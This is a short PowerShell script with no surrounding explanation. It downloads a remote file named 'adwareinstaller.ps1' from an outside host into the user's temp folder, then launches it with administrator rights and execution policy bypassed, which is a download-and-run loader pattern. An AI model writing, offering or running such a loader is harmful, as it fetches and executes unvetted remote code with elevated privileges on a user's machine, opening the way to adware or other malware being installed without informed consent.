$scriptUrl = "https://adw.info.gf/api/public/dl/ANiSwdue/adwareinstaller.ps1"
$tempScriptPath = "$env:TEMP\adwareinstaller.ps1"

Invoke-RestMethod -Uri $scriptUrl -OutFile $tempScriptPath

Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tempScriptPath`" -FromIRM" -Verb RunAs

exit